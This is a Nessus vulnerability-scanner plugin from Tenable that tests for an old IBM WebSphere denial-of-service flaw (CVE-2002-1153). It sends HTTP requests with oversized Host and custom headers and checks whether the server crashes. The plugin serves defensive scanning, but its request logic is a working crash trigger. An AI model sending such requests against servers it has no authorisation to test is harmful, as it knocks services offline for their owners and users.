#
# (C) Tenable Network Security, Inc.
#

################
# References...
################
#
# From:"Peter_Grundl" <pgrundl@kpmg.dk>
# To:"Full-Disclosure (netsys)" <full-disclosure@lists.netsys.com>
# Subject: KPMG-2002035: IBM Websphere Large Header DoS
# Date: Thu, 19 Sep 2002 10:51:07 +0200
#

include("compat.inc");

if (description)
{
  script_id(11181);
  script_version("$Revision: 1.25 $");
  script_cvs_date("$Date: 2016/11/29 20:13:38 $");

  script_cve_id("CVE-2002-1153");
  script_bugtraq_id(5749);
  script_osvdb_id(2092);

  script_name(english:"IBM WebSphere HTTP Request Header Remote Overflow");
  script_summary(english:"Too long HTTP header kills WebSphere");

   script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is vulnerable to denial of service attack.'
  );

  script_set_attribute(
    attribute:'description',
    value:
"It was possible to kill the WebSphere server by sending an invalid
request for a .jsp with a too long Host: header. 

An attacker may exploit this vulnerability to make your web server
crash continually."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Upgrade to IBM Websphere Application Server 4.0.4 or later."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(
    attribute:'see_also',
    value:'http://marc.info/?l=bugtraq&m=103244572803950&w=2'
  );

  script_set_attribute(attribute:"vuln_publication_date", value:"2002/09/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2002/12/02");
  script_set_attribute(attribute:"patch_publication_date", value:"2002/09/30");  

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:ibm:websphere_application_server");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");
  script_family(english:"Web Servers");

  script_require_ports("Services/www", 80);
  script_dependencie("find_service1.nasl", "httpver.nasl", "http_version.nasl");
  script_require_keys("www/ibm-http");
 exit(0);
}

########

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if (http_is_dead(port: port))
 exit(1, "The web server on port "+port+" is already dead.");

#
w = http_send_recv3(method:"GET", item: "/foo.jsp", 
  host: crap(1000), version: 11, port: port, exit_on_fail: 0);

w = http_send_recv3(method:"GET", item:"/bar.jsp", port:port,
  exit_on_fail: 0,
  add_headers: make_array("Nessus-Header", crap(5000)));

if (http_is_dead(port: port))
{
  if ( service_is_dead(port: port, exit: 0) > 0 ||
       report_paranoia >= 2 )
  security_warning(port);
  exit(0);
}
else
 exit(0, "The web server on port "+port+" is unaffected.");
